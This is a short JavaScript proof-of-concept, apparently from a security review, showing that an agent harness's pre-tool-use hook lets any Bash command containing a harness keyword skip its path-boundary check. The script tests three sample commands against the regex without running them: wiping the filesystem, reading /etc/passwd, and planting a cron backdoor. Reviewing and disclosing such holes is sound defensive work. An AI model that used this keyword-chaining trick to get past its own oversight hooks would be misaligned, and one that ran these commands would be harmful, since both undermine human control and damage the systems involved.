// Hook regex bypass analysis summary
const harnessControlRegex = /\b(?:makeitreal-engine|harness\.mjs)\b[^;&|]*(?:\s|^)(?:setup|status|doctor|plan|blueprint|config|hooks|dashboard|gate|verify|wiki|contracts|board|orchestrator)\b/;

// From the code flow in pre-tool-use.mjs:
// if harnessControlBash=true -> bashPaths=[] -> bashHasPaths=false
// mutatingTool = false (Bash not in MUTATING_TOOLS set)
// -> returns allow('Non-mutating tool request.')
// -> SKIPS path-boundary validation entirely

// This means: ANY bash command containing a harness keyword bypasses path checks
// Even: 'cat /etc/passwd; makeitreal-engine status'

const attackCmds = [
  'makeitreal-engine status; rm -rf /',
  'cat /etc/passwd; makeitreal-engine verify',
  'makeitreal-engine plan && echo evil > /etc/cron.d/backdoor',
];

console.log('=== Hook regex bypass (skips path-boundary check) ===');
for (const cmd of attackCmds) {
  const bypasses = harnessControlRegex.test(cmd);
  console.log(`[${bypasses ? 'HARNESS-HOOK-BYPASS' : 'CHECKED'}] ${cmd}`);
}
console.log('\nNote: Claude Code own safety still applies to Bash execution');
console.log('The harness hook returning allow() just passes to Claude Code safety layer');
console.log('This is a path-boundary-specific bypass, not a full execution bypass');
